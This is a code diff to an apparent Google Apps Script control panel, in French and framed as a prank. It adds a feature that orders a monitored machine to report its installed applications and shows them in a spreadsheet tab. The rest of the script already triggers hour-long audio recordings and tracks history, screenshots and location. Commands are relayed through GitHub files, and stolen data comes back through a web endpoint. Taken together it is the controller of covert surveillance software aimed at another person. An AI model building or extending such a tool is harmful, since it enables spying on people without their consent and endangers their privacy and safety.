@@ -27,6 +27,7 @@ const AUDIO_PATH   = 'data/blague_audio.json';
 const HISTORY_PATH     = 'data/blague_historique.json';
 const SCREENSHOT_PATH   = 'data/blague_screenshot.json';
 const LOCATION_PATH     = 'data/blague_localisation.json';
+const APPS_PATH         = 'data/blague_apps.json';
 const JOURS_MAX    = 30;
 
 function _token() {
@@ -112,6 +113,32 @@ function enregistrerAudio() {
   const f = _githubGet(AUDIO_PATH);
   _githubPut(AUDIO_PATH, { record_audio: true }, f.sha);
   SpreadsheetApp.getUi().alert('🎙️ Enregistrement lancé ! Le fichier audio (60 min) arrivera dans ton Drive à la fin.');
+}
+
+// ── APPS INSTALLEES ──────────────────────────────────────────────
+
+function demanderApps() {
+  const f = _githubGet(APPS_PATH);
+  _githubPut(APPS_PATH, { get_apps: true }, f.sha);
+  SpreadsheetApp.getUi().alert('📦 Demande envoyée ! La liste de ses apps arrive dans l\'onglet "Apps".');
+}
+
+function _afficherApps(data) {
+  const ss    = SpreadsheetApp.getActiveSpreadsheet();
+  let sheet   = ss.getSheetByName('📦 Apps');
+  if (sheet) sheet.clear();
+  else sheet  = ss.insertSheet('📦 Apps');
+
+  sheet.appendRow(['📦 Apps installées sur ' + data.machine + ' — ' + data.date]);
+  sheet.getRange(1, 1).setFontWeight('bold').setFontSize(13);
+  sheet.appendRow(['Application', 'Version', 'Éditeur', 'Date installation']);
+  sheet.getRange(2, 1, 1, 4).setFontWeight('bold').setBackground('#fef9c3');
+
+  const rows = data.apps.map(a => [a.nom, a.version || '', a.editeur || '', a.installe || '']);
+  if (rows.length > 0) sheet.getRange(3, 1, rows.length, 4).setValues(rows);
+
+  sheet.autoResizeColumns(1, 4);
+  ss.setActiveSheet(sheet);
 }
 
 // ── LOCALISATION ─────────────────────────────────────────────────
@@ -231,6 +258,11 @@ function doPost(e) {
       const bytes = Utilities.base64Decode(data.audio);
       const blob  = Utilities.newBlob(bytes, 'audio/mpeg', data.filename);
       DriveApp.getFolderById(FOLDER_ID).createFile(blob);
+      return ContentService.createTextOutput('ok');
+    }
+
+    if (data.type === 'apps') {
+      _afficherApps(data);
       return ContentService.createTextOutput('ok');
     }
 
